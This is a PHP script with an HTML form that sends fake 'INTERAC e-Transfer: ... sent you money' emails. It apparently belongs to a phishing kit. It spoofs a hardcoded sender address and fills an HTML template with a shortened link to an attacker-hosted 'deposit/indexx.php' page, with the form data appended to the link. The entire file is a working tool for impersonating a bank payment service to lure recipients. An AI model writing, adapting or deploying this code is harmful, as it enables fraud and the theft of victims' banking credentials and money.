<?php

function shortenURL($url, $service) {
    $shortenedURL = "";
    $apiURLs = [
        "shrtco" => "https://api.shrtco.de/v2/shorten?url=" . urlencode($url),
        "tinyurl" => "https://tinyurl.com/api-create.php?url=" . urlencode($url),
    ];

    if (isset($apiURLs[$service])) {
        $response = file_get_contents($apiURLs[$service]);

        if ($response) {
            $shortenedURL = trim($response);
        }
    }

    return $shortenedURL;
}

if (isset($_POST['send_email'])) {
    // Define recipient's email
    $recipient_email = $_POST['receivers_email'];

    // Original URL
    $original_url = $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST);

    // Shorten the URL using the shrtco service
    $shortened_url = shortenURL($original_url, 'shrtco');

    // Load the HTML template
    $template = file_get_contents('template.html');

    // Replace placeholders in the template
    $placeholders = [
        '{{etransfer_interac_ca}}' => $shortened_url
    ];
    $email_message = str_replace(array_keys($placeholders), array_values($placeholders), $template);

    // Subject and headers
    $subject = 'INTERAC e-Transfer: ' . $_POST['sender_name'] . ' sent you money';
    $headers = "From: andallard@mymts.net\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=utf-8\r\n";

    // Send the email
    if (mail($recipient_email, $subject, $email_message, $headers)) {
        echo 'Email sent successfully!';
    } else {
        echo 'Email not sent. Error occurred.';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Sender</title>
</head>
<body>
    <h1>Send Email with "Tap Here" Button</h1>
    <form action="your_script.php" method="post">
        <!-- Add input fields and submit button for the recipient's information here -->
        <input type="email" name="receivers_email" placeholder="Recipient's Email" required>
        <input type="text" name="sender_name" placeholder="Sender's Name" required>
        <!-- Add other input fields as needed -->
        <button type="submit" name="send_email">Send Email</button>
    </form>
</body>
</html>
